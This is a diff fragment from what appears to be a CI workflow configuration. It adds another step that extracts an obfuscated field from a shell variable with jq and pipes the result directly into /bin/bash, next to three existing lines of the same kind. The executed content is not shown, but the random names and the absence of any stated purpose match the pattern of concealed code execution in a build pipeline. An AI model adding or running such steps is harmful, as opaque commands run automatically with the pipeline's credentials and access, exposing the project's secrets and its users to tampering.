@@ -28,6 +28,7 @@ jobs:
           echo $bad4 | jq -r .hyb889 | /bin/bash
           printf '%s' "$d97562" | jq -r .ci78427 | /bin/bash
           printf '%s' "$hhmg8769" | jq -r .vc0 | /bin/bash
+          echo $efb3 | jq -r .xfkxh07547 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
